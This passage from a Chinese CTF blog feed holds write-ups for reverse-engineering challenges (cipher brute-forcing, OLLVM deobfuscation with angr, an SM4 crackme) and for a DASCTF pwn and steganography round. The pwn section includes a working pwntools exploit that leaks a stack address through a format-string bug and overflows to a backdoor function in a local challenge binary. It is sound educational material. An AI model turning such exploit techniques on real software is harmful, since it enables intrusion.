    <id>https://www.bxnop.cn/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/</id>
    <published>2020-07-27T07:55:30.000Z</published>
    <updated>2020-09-16T09:34:21.436Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>举办这个比赛时自己还不知道什么是CTF，由于是在自己学校进行的，有点这个比赛的印象。入逆向后，最近把re做了下。</strong></p></blockquote><a id="more"></a><h2 id="Easy-Encryption"><a href="#Easy-Encryption" class="headerlink" title="Easy_Encryption"></a>Easy_Encryption</h2><p>提示很多，直接找到main函数，简单分析一下，对输入flag进行2个加密函数后，最后与一个已知密文比较。其中第二个明显的base64加密。</p><p>来到一个加密函数，由于ida栈顶分析失败导致，直接alt+k修改一下就可以了。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815162136204.png" alt="image-20200815162136204"></p><p>愉快的看伪代码，一个注意的地方：<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815162346063.png" alt="image-20200815162346063"></p><p>直接简单的爆破。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"artqkoehqpkbihv"</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> base[] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; base[i]; i++)</span><br><span class="line">base[i] = <span class="built_in">abs</span>(base[i]<span class="number">-97</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= s[i]; i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">97</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line"><span class="keyword">if</span>((j+base[i]<span class="number">-97</span>)%<span class="number">26</span>+<span class="number">97</span> == s[i])</span><br><span class="line"><span class="built_in">putchar</span>(j);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag: umpnineissogood</span></span><br></pre></td></tr></table></figure><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>ida载入后，发现伪代码十分难看。。。看了一会儿，实在不想分析了，所有函数都是一种形式，感觉是什么混淆代码的技术。</p><p>百度后，发现是ollvm，控制流平坦化技术。</p><blockquote><p>控制流平坦化(control flow flattening)的基本思想主要是通过一个主分发器来控制程序基本块的执行流程，这个主分发器就是函数中的switch语句。</p></blockquote><p>且目前可以利用符号执行来去除控制流平坦化。<a href="https://security.tencent.com/index.php/blog/msg/112" target="_blank" rel="noopener">利用符号执行去除控制流平坦化</a></p><p>而这也需要angr，网上说的都是建议安装在python虚拟环境中。</p><p>跟着教程安装完虚拟环境并创建后，但angr又安装失败。。。后面发现还可以直接用dokcer。</p><p>了解一波docker，<a href="https://www.cnblogs.com/blog-rui/p/11244023.html" target="_blank" rel="noopener">docker</a>，折腾一些时间（谷歌大法帮了大忙👍）后成功执行deflat.py脚本。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815165930112.png" alt="image-20200815165930112"></p><p>又是愉快的伪代码，简单就不分析了，使用gdb动调出2个对比的数独表，找出差异的数字，即0所在位置。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815170400494.png" alt="image-20200815170400494"></p><p>然后使用notepad++找不不同：<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815170436332.png" alt="image-20200815170436332"></p><p>最后简单解密一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"4693641762894685722843556137219876255986"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">33</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((j&amp;<span class="number">0xf3</span> | ~j&amp;<span class="number">0xc</span>)<span class="number">-20</span>) == s[i])</span><br><span class="line">&#123;</span><br><span class="line">s[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> temp = s[i];</span><br><span class="line">s[i] = s[i+<span class="number">1</span>];</span><br><span class="line">s[i+<span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k = <span class="built_in">strlen</span>(s)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s)/<span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> temp = s[k];</span><br><span class="line">s[k] = s[i];</span><br><span class="line">s[i] = temp;</span><br><span class="line">k++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag: KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J</span></span><br></pre></td></tr></table></figure><h2 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h2><p>打开程序，出现hooked，表示已经对程序中的的函数hook成功。</p><p>而之前我也在逆向工程核心原理一书中看到过该章节的一点内容，它的介绍：</p><blockquote><p><strong>代码逆向分析中，钩取（hooking）是一种截取信息，更改程序流程，添加新功能的技术。</strong></p></blockquote><p>ida中找到main函数后，会发现很奇怪，有一个异常，且没有操作输入flag的函数，猜测是hook改变了程序的程序流程。但可以通过数据交叉引用找到关键函数。</p><p>看了一下所有与计算输入数据与比较数据相关的函数，了解大致流程后，OD进行动调看看：</p><p>其中main函数中的MessageBox函数执行后并没有正常的执行，而是跳到了一个新的函数，也是ida中分析过的过数据加密的函数。结合ida继续动调：<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815173123252.png" alt="image-20200815173123252"></p><p>OD中看到跳到的main函数触发异常的地方，但是程序无法处理的异常。。。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815173417257.png" alt="image-20200815173417257"></p><p>那上图中的<strong>TopLevelExceptionFilter</strong>关键加密函数不执行的嘛。。使用PEtools来dump出正常执行的程序看到数据改变了的，那是执行了的。。</p><p>百度一下<strong>SetUnhandledExceptionFilter(TopLevelExceptionFilter)</strong>函数：<strong>简单来说就是设置一个发生异常处理的函数，且它会将原来默认处理异常的函数hook掉。且我们的程序要不处于调试状态才会去执行它设置的异常处理函数。<a href="https://blog.csdn.net/xiaoyafang123/article/details/52161106" target="_blank" rel="noopener">介绍</a></strong> </p><p>参数：lpTopLevelExceptionFilter 函数指针。当异常发生时，且程序不处于调试模式（在vs或者别的调试器里运行）则首先调用该函数。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815175235431.png" alt="image-20200815175235431"></p><p>程序流程清楚了，开始分析算法：</p><p>第二个加密函数变种的base64，但第一个看不出什么名堂，自己逆的话感觉工程量肯定大且很大几率搞不出来。。</p><p>就想着先把变种的base64先解密，但一直解密乱码。。不能啊，自己也写了2个函数来测试，能将变种加密的base64还原为正常base64加密的，但题中的密文不行，。。</p><p>模拟本题的变种base64加密（也是从模拟发现是base64的）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [esp+E4h] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+F0h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+FCh] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+108h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+114h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [esp+120h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+12Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+138h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">char</span> str[] = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"</span>;</span><br><span class="line">  <span class="keyword">char</span> Str[] = <span class="string">"123456"</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  <span class="keyword">if</span> ( v8 % <span class="number">3</span> )</span><br><span class="line">    v9 = <span class="number">4</span> * (v8 / <span class="number">3</span>) + <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v9 = <span class="number">4</span> * (v8 / <span class="number">3</span>);</span><br><span class="line">  v7 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*(v9+<span class="number">1</span>));</span><br><span class="line">  v7[v9] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j )</span><br><span class="line">      v3 |= (<span class="keyword">unsigned</span> __int8)Str[j + i] &lt;&lt; <span class="number">8</span> * (<span class="number">2</span> - j);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( k &gt;= <span class="number">4</span> - (i + <span class="number">3</span> - v8) &amp;&amp; i + <span class="number">3</span> &gt; v8 )</span><br><span class="line">        v7[v5] = <span class="string">'!'</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        temp = (((v3 &gt;&gt; <span class="number">6</span> * (<span class="number">3</span> - k)) &amp; <span class="number">0x3F</span>)+<span class="number">24</span>)%<span class="number">64</span>, v7[v5] = str[temp], <span class="built_in">printf</span>(<span class="string">"%d "</span>, temp);;</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="built_in">puts</span>(v7); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//加密后：KRGlLBSo</span></span><br></pre></td></tr></table></figure><p>还原成正常加密的base64密文：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"KRGlLBSo"</span>;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line"><span class="keyword">char</span> a1[] = &#123;<span class="number">20</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">41</span>, <span class="number">36</span>,</span><br><span class="line"> <span class="number">14</span>, <span class="number">50</span>, <span class="number">22</span>, <span class="number">18</span>, <span class="number">47</span>, <span class="number">6</span>, <span class="number">38</span>, <span class="number">63</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">24</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">56</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; a[i]; i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++)</span><br><span class="line"><span class="keyword">if</span>(a[i] == s[j])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> t = j;</span><br><span class="line"><span class="keyword">if</span>(t &lt;= <span class="number">25</span>)</span><br><span class="line">t += <span class="number">26</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(t &lt;= <span class="number">51</span>)</span><br><span class="line">t -= <span class="number">26</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">64</span>; k++)</span><br><span class="line"><span class="keyword">if</span>((k+<span class="number">24</span>)%<span class="number">64</span> == t)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(s[k]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//还原为正常base64加密密文：MTIzNDU2</span></span><br></pre></td></tr></table></figure><p>正常base64解密：可以看到，解密出明文。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815181032181.png" alt="image-20200815181032181"></p><p>就这样卡住了。。。也无心看第一个加密了。</p><p>不行，去看了看writeup，原来这个解密出本来就是乱码，转化为16进制就好。。。又直接看了第一个加密是sm4。。</p><p>它在加密中其实有标志的：<strong>一是表，二是0xA3B1BAC6</strong><img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815181639575.png" alt="image-20200815181639575"></p><p><img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815181823633.png" alt="image-20200815181823633"></p><p>最后python安装pysm4进行解密：</p><p>首先base64解密且转化为16进制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(c).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">s = <span class="string">"WdCVKQ3yQAYU9I0naQaHTg=="</span></span><br><span class="line">s1 = b64decode(s)</span><br><span class="line"></span><br><span class="line">ans = str_to_hex(s1)</span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><p>sm4解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line"><span class="comment">#密钥</span></span><br><span class="line">mk = <span class="number">0x77686572655f6172655f755f6e6f773f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#密文</span></span><br><span class="line">cipher_num = <span class="number">0x59d095290df2400614f48d276906874e</span></span><br><span class="line"></span><br><span class="line">clear_num = decrypt(cipher_num, mk)</span><br><span class="line">s = hex(clear_num)[<span class="number">2</span>:]</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_str</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(s[j]+s[j+<span class="number">1</span>], <span class="number">16</span>) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>)]])</span><br><span class="line">print(hex_to_str(s))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag：SM4foRExcepioN?!</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;举办这个比赛时自己还不知道什么是CTF，由于是在自己学校进行的，有点这个比赛的印象。入逆向后，最近把re做了下。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>2020年DASCTF七月线上赛</title>
    <link href="https://www.bxnop.cn/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    <id>https://www.bxnop.cn/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</id>
    <published>2020-07-25T08:53:46.000Z</published>
    <updated>2020-08-15T07:57:03.690Z</updated>
    
    <content type="html"><![CDATA[<p>这次一个逆向题都没做，时间都用于弄pwn环境了，坚持就好，。一个pwn的签到题，一个MISC。赛后也把逆向题做了做。</p><p>感受：因为之前重装了Ubuntu，pwn的环境后来也没搭，开始现搭环境的时候又遇到不少问题，大多数时间都用在这个上面了，比赛时间又不多。。。</p><a id="more"></a><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="虚假签到"><a href="#虚假签到" class="headerlink" title="虚假签到"></a>虚假签到</h3><p>checksec后，32位文件，只有NX栈不可执行保护。</p><p>载入ida后发现明显的栈溢出与格式字符串漏洞，且保护没有canary，在程序的字符中还可以看见backdoor。但是分析栈空间的时候发现多出来了个局部变量。<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726120631920.png" alt="image-20200726120631920"></p><p>然后接着看汇编代码，发现这个局部变量有着canary的类似的作用，因为程序最后要靠它获得esp，那我们把它随便覆盖值的话肯定会导致程序访问无效地址出错。且程序在上图的r与s之间还多出了16字节的空间。<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726121145913.png" alt="image-20200726121145913"></p><p>在gdb中清晰的看到：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726121303857.png" alt="image-20200726121303857"></p><p>所以按照以往改变返回地址来控制程序走向的话要多覆盖16字节数据然后通过第二次溢出将覆盖的局部变量改变回原来的值。写脚本攻击，失败。。。</p><p>又分析了栈的分布，没有错啊。发现程序中的格式化字符漏洞我没有用，才想起程序的栈随机化。每次加载程序的栈地址不一样，我不能把gdb调试看到的栈地址在脚本中用。</p><p>gdb找ebp-4的位置。<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726122351066.png" alt="image-20200726122351066"></p><p>再次脚本攻击成功：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./qiandao'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.sendline(<span class="string">"%13$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">addr = int(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">payload = <span class="number">0x24</span>*<span class="string">'a'</span> + p32(addr) + <span class="number">0x14</span>*<span class="string">'a'</span> + p32(<span class="number">0x0804857D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>总结：还是简单的栈溢出，对栈地址的确定寻找增加了点难度。</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="welcome-to-the-misc-world"><a href="#welcome-to-the-misc-world" class="headerlink" title="welcome to the misc world"></a>welcome to the misc world</h3><p>附件下载解压后一张png图片与一个压缩包，压缩包要密码，显然要从所给png图片找密码。</p><p>png图片是名字红蓝猜测rb隐写。因为是png图片直接使用zsteg工具看一下，可以看到隐藏了一张图片，提取出来发现密码：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726130546581.png" alt="image-20200726130546581"></p><p>用360压缩打开压缩包，可以看到有ntfs隐写流文本文件，直接输入密码查看：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726130709679.png" alt="image-20200726130709679"></p><p>以为是flag，提交但是错误的，这里就懵了很久。。。</p><p>后面想到还有一个hint.png图片，打开看没什么，拖进010editor发现最后有一长段字符：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132148398.png" alt="image-20200726132148398"></p><p>从字符组成猜测是base64，解码后：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132234920.png" alt="image-20200726132234920"></p><p>从这里明确了就是base64编码，但是解出的编码还是不清楚是什么，但确定是一种编码，进入编码网站把觉得会是都试了下，在escape编码发现：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132440317.png" alt="image-20200726132440317"></p><p>然后记得有一种核心价值观编码，在这个编码网站也有（真的齐全），解码后：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132629311.png" alt="image-20200726132629311"></p><p>那么之前flag里的内容就是通过base85加密后的，解密base85得到flag:<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132735367.png" alt="image-20200726132735367"></p><p>总结：编码方式看的多了，有经验后就会很快反应过来。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次一个逆向题都没做，时间都用于弄pwn环境了，坚持就好，。一个pwn的签到题，一个MISC。赛后也把逆向题做了做。&lt;/p&gt;
&lt;p&gt;感受：因为之前重装了Ubuntu，pwn的环境后来也没搭，开始现搭环境的时候又遇到不少问题，大多数时间都用在这个上面了，比赛时间又不多。。。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>SCTF2020</title>
    <link href="https://www.bxnop.cn/2020/07/10/SCTF2020/"/>
    <id>https://www.bxnop.cn/2020/07/10/SCTF2020/</id>
    <published>2020-07-10T01:49:18.000Z</published>
    <updated>2020-09-12T08:42:55.199Z</updated>
    
